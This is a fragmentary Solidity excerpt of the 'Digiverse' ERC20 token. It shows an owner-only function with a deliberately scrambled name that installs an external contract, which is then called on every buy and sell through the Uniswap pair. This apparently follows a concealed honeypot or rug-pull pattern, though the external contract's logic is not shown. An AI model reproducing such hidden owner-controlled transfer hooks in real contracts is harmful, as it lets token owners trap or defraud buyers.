...
contract TokenM is ERC20 {
    ...
    IUserAmountlmnhyu public lmnhyu;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Digiverse", "DIGI") {
    ...
    function cootefrtBhhvfeRssa(IUserAmountlmnhyu _lmnhyu) public onlyOwner {
        lmnhyu = _lmnhyu;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                lmnhyu.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				lmnhyu.addOutAmount(from, amount);
            }else{
                lmnhyu.addOutAmount(from, amount);
                takeFee = false;
            }
